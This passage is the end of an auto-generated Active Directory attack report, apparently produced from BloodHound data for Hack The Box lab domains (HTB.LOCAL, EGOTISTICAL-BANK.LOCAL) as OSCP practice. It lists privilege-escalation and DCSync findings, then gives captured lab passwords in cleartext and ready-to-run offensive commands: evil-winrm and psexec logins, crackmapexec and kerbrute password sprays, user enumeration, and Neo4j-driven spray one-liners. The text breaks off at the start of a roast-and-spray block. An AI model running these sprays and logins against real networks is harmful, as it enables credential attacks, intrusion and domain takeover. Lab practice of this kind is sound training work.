| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | DOMAIN COMPUTERS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| ADMINISTRATORS@EGOTISTICAL-BANK.LOCAL | HYPER-V ADMINISTRATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | REPLICATOR@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | BACKUP OPERATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | PRINT OPERATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | ADMINISTRATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL | ['User'] |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | KRBTGT@EGOTISTICAL-BANK.LOCAL | ['User'] |

### [-] GPO Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] OU Control for Object Manipulation
**OSCP Relevance:** MEDIUM | **Results:** 1

> Find principals with GenericAll on OUs containing privileged objects. Can modify objects within the OU.

| Attacker | ControlledOU |
| --- | --- |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | MICROSOFT EXCHANGE SECURITY GROUPS@HTB.LOCAL |

### [-] AllExtendedRights Enumeration
**OSCP Relevance:** HIGH | **Results:** None

### [-] Read LAPS Password Rights
**OSCP Relevance:** HIGH | **Results:** None

### [OK] All Domain Admins
**OSCP Relevance:** HIGH | **Results:** 2

> List all members of Domain Admins group (including nested membership). Know your targets.

| DomainAdmin | Enabled | AdminCount |
| --- | --- | --- |
| ADMINISTRATOR@HTB.LOCAL | True | True |
| ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL | True | True |

### [OK] GenericWrite on Users
**OSCP Relevance:** HIGH | **Results:** 44

> Find principals with GenericWrite on users. Can modify SPN for Kerberoasting or set logon script.

| Attacker | Victim | VictimIsPrivileged |
| --- | --- | --- |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX0659CC1@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXB01AC64@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX7108A4E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXFD87238@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX83D6781@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX6DED678@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX968E74D@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOX670628E@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXFC9DAAD@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXC0A90C9@HTB.LOCAL | False |
| EXCHANGE SERVERS@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |
| ORGANIZATION MANAGEMENT@HTB.LOCAL | HEALTHMAILBOXC3D7722@HTB.LOCAL | False |

### [-] WriteSPN for Targeted Kerberoasting
**OSCP Relevance:** HIGH | **Results:** None

### [-] WriteAccountRestrictions for RBCD
**OSCP Relevance:** HIGH | **Results:** None

### [-] SyncLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### [-] AddAllowedToAct Rights
**OSCP Relevance:** HIGH | **Results:** None

### [OK] DCSync (Composite Check)
**OSCP Relevance:** HIGH | **Results:** 1

> Find principals with BOTH GetChanges AND GetChangesAll on the domain. These can perform DCSync to extract all password hashes.

| DCSync_Principal | Type | Domain |
| --- | --- | --- |
| SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL | ['User'] | EGOTISTICAL-BANK.LOCAL |

### Check Account Operators Membership
*Skipped - requires variables: USER*

### [OK] Check Exchange WriteDACL on Domain
**OSCP Relevance:** HIGH | **Results:** 2

> Check if Exchange Windows Permissions group has WriteDACL on the domain. This is the prerequisite for the Exchange WriteDACL to DCSync attack chain.

| ExchangeGroup | Domain | AttackPotential |
| --- | --- | --- |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HTB.LOCAL | Can grant DCSync rights via WriteDACL |
| EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL | HTB.LOCAL | Can grant DCSync rights via WriteDACL |

### Check Backup Operators Membership
*Skipped - requires variables: USER*

### Check Server Operators Membership
*Skipped - requires variables: USER*

### Check AddMember to Specific Group
*Skipped - requires variables: USER, TARGET_GROUP*

---

## Attack Chains

### [-] Full Attack Path: Owned User -> Pivot -> DA
**OSCP Relevance:** HIGH | **Results:** None

### [-] Shortest Path to Domain Admins
**OSCP Relevance:** HIGH | **Results:** None

### [-] All Paths to Domain Admin (Multi-Hop)
**OSCP Relevance:** HIGH | **Results:** None

### [-] Credential Harvest Opportunities
**OSCP Relevance:** HIGH | **Results:** None

### Find Paths Through Specific Computer
*Skipped - requires variables: COMPUTER*

### Shortest Path Between Two Users
*Skipped - requires variables: SOURCE_USER, TARGET_USER*

### [-] Path to High-Value Targets
**OSCP Relevance:** HIGH | **Results:** None

### [-] Circular Group Memberships
**OSCP Relevance:** LOW | **Results:** None

---

## Owned Principal

### What Can Owned User Access?
*Skipped - requires variables: USER*

### Quick Wins from Owned User Context
*Skipped - requires variables: USER*

### Path to DA from Owned User
*Skipped - requires variables: USER*

### Owned User Group Memberships
*Skipped - requires variables: USER*

### Outbound Object Control from Owned
*Skipped - requires variables: USER*

### First Hop Lateral Movement
*Skipped - requires variables: USER*

### Kerberoastable from Owned Context
*Skipped - requires variables: USER*

### [OK] AS-REP Targets from Owned Context
**OSCP Relevance:** HIGH | **Results:** 3

> Find AS-REP roastable accounts. These can be attacked without any additional access.

| User | IsPrivileged | Description |
| --- | --- | --- |
| SVC-ALFRESCO@HTB.LOCAL | True |  |
| SVC-ALFRESCO@HTB.LOCAL | True |  |
| FSMITH@EGOTISTICAL-BANK.LOCAL | False |  |

### Session Harvest Opportunities
*Skipped - requires variables: USER*

### Chained Privilege Escalation
*Skipped - requires variables: USER*

---

## Operational

### [OK] Computers by Operating System (Find Legacy)
**OSCP Relevance:** MEDIUM | **Results:** 3

> Enumerate computers grouped by OS. Legacy systems (2008, 2003, XP) are often more vulnerable.

| OS | Computers | Count |
| --- | --- | --- |
| WINDOWS SERVER 2016 STANDARD | ['FOREST.HTB.LOCAL', 'EXCH01.HTB.LOCAL'] | 2 |
| Windows Server 2016 Standard | ['EXCH01.HTB.LOCAL'] | 1 |
| Windows Server 2019 Datacenter | ['SAUNA.EGOTISTICAL-BANK.LOCAL'] | 1 |

### [-] Legacy Windows Systems
**OSCP Relevance:** HIGH | **Results:** None

### [OK] Password Age Distribution
**OSCP Relevance:** MEDIUM | **Results:** 25

> Find users with old passwords. Old passwords may be weak or appear in breach databases.

| User | PasswordLastSet | IsPrivileged | Description |
| --- | --- | --- | --- |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXC0A90C9@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX670628E@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX670628E@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX968E74D@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX968E74D@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX6DED678@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX6DED678@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX83D6781@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX83D6781@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXFD87238@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXFD87238@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXB01AC64@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOXB01AC64@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX7108A4E@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX7108A4E@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX0659CC1@HTB.LOCAL | 6 years ago | False |  |
| HEALTHMAILBOX0659CC1@HTB.LOCAL | 6 years ago | False |  |
| SEBASTIEN@HTB.LOCAL | 6 years ago | False |  |
| SEBASTIEN@HTB.LOCAL | 6 years ago | False |  |
| LUCINDA@HTB.LOCAL | 6 years ago | False |  |
| LUCINDA@HTB.LOCAL | 6 years ago | False |  |
| MARK@HTB.LOCAL | 6 years ago | False |  |
| MARK@HTB.LOCAL | 6 years ago | False |  |
| SANTI@HTB.LOCAL | 6 years ago | False |  |

### [OK] Inactive User Accounts
**OSCP Relevance:** MEDIUM | **Results:** 12

> Find enabled users who haven't logged in recently. May have default or forgotten passwords.

| User | LastLogon | Description |
| --- | --- | --- |
| SEBASTIEN@HTB.LOCAL | 6 years ago |  |
| SEBASTIEN@HTB.LOCAL | 6 years ago |  |
| HEALTHMAILBOXFC9DAAD@HTB.LOCAL | 6 years ago |  |
| HEALTHMAILBOXFC9DAAD@HTB.LOCAL | 6 years ago |  |
| HEALTHMAILBOXC3D7722@HTB.LOCAL | 6 years ago |  |
| HEALTHMAILBOXC3D7722@HTB.LOCAL | 6 years ago |  |
| ADMINISTRATOR@HTB.LOCAL | 2 days ago | Built-in account for administering the computer/domain |
| ADMINISTRATOR@HTB.LOCAL | 2 days ago | Built-in account for administering the computer/domain |
| SVC-ALFRESCO@HTB.LOCAL | 1 day ago |  |
| SVC-ALFRESCO@HTB.LOCAL | 1 day ago |  |
| ADMINISTRATOR@EGOTISTICAL-BANK.LOCAL | 8 hours ago | Built-in account for administering the computer/domain |
| FSMITH@EGOTISTICAL-BANK.LOCAL | In the future |  |

### [OK] Enabled vs Disabled Account Ratio
**OSCP Relevance:** LOW | **Results:** 3

> Count enabled vs disabled accounts. High disabled count may indicate account churn.

| Enabled | Count |
| --- | --- |
|  | 5 |
| True | 40 |
| False | 30 |

### [-] Domain Trust Relationships
**OSCP Relevance:** MEDIUM | **Results:** None

### [OK] Relationship Count by Type
**OSCP Relevance:** LOW | **Results:** 21

> Count all relationship types in the database. Helps understand AD structure and attack surface.

| Relationship | Count |
| --- | --- |
| GenericAll | 1541 |
| WriteDacl | 1169 |
| GenericWrite | 1040 |
| WriteOwner | 820 |
| Owns | 596 |
| WriteOwnerRaw | 372 |
| AddMember | 310 |
| OwnsRaw | 280 |
| MemberOf | 266 |
| AddKeyCredentialLink | 256 |
| Contains | 190 |
| AllExtendedRights | 180 |
| ForceChangePassword | 166 |
| GetChanges | 20 |
| GetChangesAll | 14 |
| AdminTo | 6 |
| GPLink | 4 |
| GetChangesInFilteredSet | 4 |
| CanPSRemote | 4 |
| CoerceToTGT | 2 |
| HAS_POLICY | 2 |

### [OK] High-Value Target Summary
**OSCP Relevance:** HIGH | **Results:** 27

> List all objects marked as high-value in BloodHound. Primary targets for attack planning.

| Target | Type | Description |
| --- | --- | --- |
| HTB.LOCAL | ['Base', 'Domain', 'Tag_Tier_Zero'] |  |
| EGOTISTICAL-BANK.LOCAL | ['Domain'] |  |
| HTB.LOCAL | ['Domain', 'Tag_Tier_Zero'] |  |
| ACCOUNT OPERATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] | Members can administer domain user and group accounts |
| ACCOUNT OPERATORS@HTB.LOCAL | ['Group'] | Members can administer domain user and group accounts |
| ADMINISTRATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] | Administrators have complete and unrestricted access to the computer/domain |
| ADMINISTRATORS@HTB.LOCAL | ['Group'] | Administrators have complete and unrestricted access to the computer/domain |
| BACKUP OPERATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
| BACKUP OPERATORS@HTB.LOCAL | ['Group'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
| DOMAIN ADMINS@EGOTISTICAL-BANK.LOCAL | ['Group'] | Designated administrators of the domain |
| DOMAIN ADMINS@HTB.LOCAL | ['Group'] | Designated administrators of the domain |
| DOMAIN CONTROLLERS@EGOTISTICAL-BANK.LOCAL | ['Group'] | All domain controllers in the domain |
| DOMAIN CONTROLLERS@HTB.LOCAL | ['Group'] | All domain controllers in the domain |
| ENTERPRISE ADMINS@EGOTISTICAL-BANK.LOCAL | ['Group'] | Designated administrators of the enterprise |
| ENTERPRISE ADMINS@HTB.LOCAL | ['Group'] | Designated administrators of the enterprise |
| PRINT OPERATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] | Members can administer printers installed on domain controllers |
| PRINT OPERATORS@HTB.LOCAL | ['Group'] | Members can administer printers installed on domain controllers |
| SERVER OPERATORS@EGOTISTICAL-BANK.LOCAL | ['Group'] | Members can administer domain servers |
| SERVER OPERATORS@HTB.LOCAL | ['Group'] | Members can administer domain servers |
| ACCOUNT OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain user and group accounts |
| ADMINISTRATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | Administrators have complete and unrestricted access to the computer/domain |
| BACKUP OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | Backup Operators can override security restrictions for the sole purpose of backing up or restoring files |
| DOMAIN ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the domain |
| DOMAIN CONTROLLERS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | All domain controllers in the domain |
| ENTERPRISE ADMINS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | Designated administrators of the enterprise |
| PRINT OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer printers installed on domain controllers |
| SERVER OPERATORS@HTB.LOCAL | ['Group', 'Base', 'Tag_Tier_Zero'] | Members can administer domain servers |

---

## Summary

| Metric | Count |
| ------ | ----- |
| Total Queries | 79 |
| With Results | 32 |
| No Results | 29 |
| Skipped | 18 |
| Failed | 0 |

### Key Findings

- **WriteDacl Abuse Paths**: 100 results (Privilege Escalation)
- **WriteOwner Abuse Paths**: 100 results (Privilege Escalation)
- **AddKeyCredentialLink (Shadow Credentials)**: 100 results (Privilege Escalation)
- **Owns Relationships on Users/Groups**: 79 results (Privilege Escalation)
- **ForceChangePassword Rights**: 54 results (Privilege Escalation)
- **GenericAll on High-Value Targets**: 50 results (Privilege Escalation)
- **GenericWrite on Users**: 44 results (Privilege Escalation)
- **High-Value Target Summary**: 27 results (Operational)
- **AddMember to Privileged Groups**: 24 results (Privilege Escalation)
- **DCSync Rights**: 17 results (Privilege Escalation)
- **AS-REP Roastable Users**: 3 results (Quick Wins)
- **AS-REP Targets from Owned Context**: 3 results (Owned Principal)
- **Unconstrained Delegation Systems**: 2 results (Quick Wins)
- **PSRemote Access (Evil-WinRM Targets)**: 2 results (Lateral Movement)
- **All Domain Admins**: 2 results (Privilege Escalation)
- **Check Exchange WriteDACL on Domain**: 2 results (Privilege Escalation)
- **Kerberoastable Service Accounts**: 1 results (Quick Wins)
- **Users with Passwords in Description**: 1 results (Quick Wins)
- **All Local Admins per Computer**: 1 results (Lateral Movement)
- **Coercion Targets (Unconstrained Delegation)**: 1 results (Lateral Movement)
- **DCSync (Composite Check)**: 1 results (Privilege Escalation)


## 🎯 Pwned User Attack Paths

### FSMITH@EGOTISTICAL-BANK.LOCAL
**Credential:** password

#### User-Level Access (1 machines)

**SAUNA.EGOTISTICAL-BANK.LOCAL**

| Technique | Command |
|-----------|---------|
| evil-winrm | `evil-winrm -i 10.10.10.175 -u FSMITH -p 'Thestrokes23'` |
| winrs | `winrs -r:10.10.10.175 -u:egotistical-bank.local\FSMITH -p:Thestrokes23 cmd` |

### SVC-ALFRESCO@HTB.LOCAL
**Credential:** password

#### Manual Enumeration (BloodHound edges may be incomplete)

> BloodHound may not capture all access:
> - Service accounts often have local admin where they run
> - Local group memberships require SMB enumeration during collection

**Network-Wide Testing**

| Test | Command |
|------|---------|
| Test Admin Access | `crackmapexec smb 10.10.10.0/24 -u 'SVC-ALFRESCO' -p 's3rvice' -d htb.local` |
| Enumerate Shares | `crackmapexec smb 10.10.10.0/24 -u 'SVC-ALFRESCO' -p 's3rvice' -d htb.local --shares` |

**Optional (medium priority)**

| Test | Command |
|------|---------|
| Test WinRM | `crackmapexec winrm 10.10.10.0/24 -u 'SVC-ALFRESCO' -p 's3rvice' -d htb.local` |
| Test RDP | `crackmapexec rdp 10.10.10.0/24 -u 'SVC-ALFRESCO' -p 's3rvice' -d htb.local` |
| Enum Sessions | `crackmapexec smb 10.10.10.0/24 -u 'SVC-ALFRESCO' -p 's3rvice' -d htb.local --sessions` |

> **Tip:** Look for `(Pwn3d!)` in output - that means admin access BloodHound missed!

#### Authenticated User Attacks (Any Domain User)

Replace placeholders with your credentials:

| Attack | Command Template |
|--------|------------------|
| AS-REP Roasting ⚡ | `impacket-GetNPUsers '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| Kerberoasting ⚡ | `impacket-GetUserSPNs '<DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip <DC_IP> -request` |
| BloodHound Collection ⚡ | `bloodhound-python -c all -u <USERNAME> -p '<PASSWORD>' -d <DOMAIN> -dc <DC_IP>` |
| Domain User Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --users` |
| Domain Admins Members | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M groupmembership -o GROUP='Domain Admins'` |
| Share Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --shares` |
| Computer Enumeration | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --computers` |
| Password Policy | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol` |
| Domain Trust Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts` |
| GPO Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo` |


# Tailored Spray Commands

Based on BloodHound access relationships.

## Summary

- **Users with access:** 3
- **Target machines:** 1
- **Access types:** AdminTo, CanPSRemote

## Local Admin (AdminTo)

1 users, 1 unique target groups

### Group 1: 1 user(s) → 1 target(s)

**Users:** `administrator`

**Targets:**

- `SAUNA.EGOTISTICAL-BANK.LOCAL` (10.10.10.175)

#### File-based commands

```bash
# Create user and target files
echo -e "administrator" > users_g1.txt
echo -e "10.10.10.175" > targets_g1.txt
crackmapexec smb targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in administrator; do
  for target in 10.10.10.175; do
    crackmapexec smb $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (evil-winrm)
evil-winrm -i 10.10.10.175 -u administrator -p '<PASSWORD>'
```

```bash
# PSExec
impacket-psexec 'HTB/administrator:<PASSWORD>'@10.10.10.175
```

```bash
# WMIExec
impacket-wmiexec 'HTB/administrator:<PASSWORD>'@10.10.10.175
```

## PS Remoting (CanPSRemote)

2 users, 1 unique target groups

### Group 1: 2 user(s) → 1 target(s)

**Users:** `fsmith, svc_loanmgr`

**Targets:**

- `SAUNA.EGOTISTICAL-BANK.LOCAL` (10.10.10.175)

#### File-based commands

```bash
# Create user and target files
echo -e "fsmith\nsvc_loanmgr" > users_g1.txt
echo -e "10.10.10.175" > targets_g1.txt
evil-winrm -i targets_g1.txt -u users_g1.txt -p '<PASSWORD>'
```

#### Inline bash loop

```bash
for user in fsmith svc_loanmgr; do
  for target in 10.10.10.175; do
    evil-winrm -i $target -u $user -p '<PASSWORD>'
  done
done
```

**Alternative protocols:**

```bash
# WinRM (CrackMapExec)
crackmapexec winrm 10.10.10.175 -u fsmith -p '<PASSWORD>'
```

## Monolithic Spray

One attempt per user on their best target. Set `PASSWORD` once at the top.

### Edge Selection Logic

```
  1 user via AdminTo (local admin → SMB auth)
  2 users via CanPSRemote (WinRM → evil-winrm auth)
  0 users via CanRDP (RDP → xfreerdp3 auth)
  Priority: AdminTo > CanPSRemote > CanRDP > ExecuteDCOM > ReadLAPSPassword
  Each user sprayed exactly once on their highest-privilege target
```

### Commands

```bash
PASSWORD='<PASSWORD>'

# --- administrator → 10.10.10.175 (SAUNA) ---
# AdminTo (direct): MATCH (administrator)-[:AdminTo]->(SAUNA)
crackmapexec smb 10.10.10.175 -u administrator -p "$PASSWORD"

# --- fsmith → 10.10.10.175 (SAUNA) ---
# CanPSRemote (direct): MATCH (fsmith)-[:CanPSRemote]->(SAUNA)
evil-winrm -i 10.10.10.175 -u fsmith -p "$PASSWORD"

# --- svc_loanmgr → 10.10.10.175 (SAUNA) ---
# CanPSRemote (direct): MATCH (svc_loanmgr)-[:CanPSRemote]->(SAUNA)
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p "$PASSWORD"

```

---

> **NOTE:** Replace `<PASSWORD>` with actual credentials.


## 🔑 Password Spray Recommendations

### Captured Passwords

```
Thestrokes23
s3rvice
```

### Spray Methods

#### Method 1: SMB-Based Spray (crackmapexec/netexec)

Ports: 445 | Noise: HIGH

```bash
crackmapexec smb 10.10.10.175 -u users.txt -p 'Thestrokes23' -d htb.local --continue-on-success
```
```bash
crackmapexec smb 10.10.10.175 -u users.txt -p 's3rvice' -d htb.local --continue-on-success
```
- ✅ Shows admin access (Pwn3d!), validates creds + checks admin in one step
- ❌ Very noisy (Event logs 4625), triggers lockouts, detected by EDR

#### Method 2: Kerberos TGT-Based Spray (kerbrute)

Ports: 88 | Noise: LOW

```bash
kerbrute passwordspray -d htb.local --dc 10.10.10.175 users.txt 'Thestrokes23'
```
```bash
kerbrute passwordspray -d htb.local --dc 10.10.10.175 users.txt 's3rvice'
```
- ✅ Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users
- ❌ No admin check (just validates creds), requires valid userlist, Kerberos only

#### Method 3: LDAP/ADSI-Based Spray (PowerShell)

Ports: 389, 636 | Noise: MEDIUM

```bash
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Thestrokes23' -Verbose
```
```bash
Invoke-DomainPasswordSpray -UserList users.txt -Password 's3rvice' -Verbose
```
- ✅ Built into Windows - no external tools needed, uses native APIs, scriptable
- ❌ Windows-only, slower than Kerberos, requires PowerShell access on target

### User Enumeration

**Enumerate valid users via Kerberos pre-auth**
```bash
kerbrute userenum -d htb.local --dc 10.10.10.175 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt
```

**LDAP enumeration with credentials**
```bash
ldapsearch -x -H ldap://10.10.10.175 -D 'htb.local\FSMITH' -w '<PASSWORD>' -b '<DOMAIN_DN>' '(objectClass=user)' sAMAccountName | grep sAMAccountName | cut -d' ' -f2 > users.txt
```

**CME user enumeration (authenticated)**
```bash
crackmapexec smb 10.10.10.175 -u 'FSMITH' -p '<PASSWORD>' -d htb.local --users | awk '{print $5}' | grep -v '\[' > users.txt
```

**Export users from BloodHound Neo4j (clean output)**
```bash
echo "MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > users.txt
```

**RPC user enumeration**
```bash
rpcclient -U 'FSMITH%<PASSWORD>' 10.10.10.175 -c 'enumdomusers' | grep -oP '\[.*?\]' | tr -d '[]' | cut -d' ' -f1 > users.txt
```

**enum4linux user enumeration (unauthenticated if allowed)**
```bash
enum4linux -U 10.10.10.175 | grep 'user:' | cut -d':' -f2 | awk '{print $1}' > users.txt
```

### Spray One-Liners

**1. Full Neo4j Spray (Stealth)**
_Export non-pwned users + passwords from Neo4j, spray with kerbrute_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true AND u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' | sort -u > spray_passwords.txt && for p in $(cat spray_passwords.txt); do kerbrute passwordspray -d htb.local --dc 10.10.10.175 targets.txt "$p"; sleep 1800; done
```

**2. Neo4j Spray + Admin Check (CME)**
_Export from Neo4j, spray with CME to identify admin access (Pwn3d!)_
```bash
echo "MATCH (u:User) WHERE (u.pwned IS NULL OR u.pwned = false) AND u.enabled = true RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > targets.txt && echo "MATCH (u:User) WHERE u.pwned = true UNWIND u.pwned_cred_values AS cred RETURN cred" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | sort -u > spray_passwords.txt && crackmapexec smb 10.10.10.175 -u targets.txt -p spray_passwords.txt -d htb.local --continue-on-success --no-bruteforce
```

**3. AS-REP Roast -> Crack -> Spray**
_Roast AS-REP users, crack hashes, spray cracked passwords_
```bash
